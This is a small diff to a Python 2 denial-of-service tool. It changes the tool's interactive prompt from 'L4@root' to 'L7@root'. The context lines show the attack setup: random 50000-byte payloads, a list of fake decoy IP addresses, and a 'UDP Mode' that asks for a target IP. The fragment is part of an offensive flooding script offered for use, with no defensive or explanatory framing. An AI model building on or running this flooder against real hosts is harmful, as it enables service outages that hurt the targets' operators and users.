@@ -39,7 +39,7 @@ while True:
         byte2 = random._urandom(50000)
         sent = 5000
         fakeit = ['192.168.1.1','192.154.4.4','192.167.1.4','192.155.3.3']
-        prompt = raw_input("\033[1;34mL4@root \033[1;33m~$ \033[37m")
+        prompt = raw_input("\033[1;34mL7@root \033[1;33m~$ \033[37m")
         if prompt.lower() == "udp":
             print "\033[1;33mUDP Mode"
             ip = raw_input("IP Target : ")
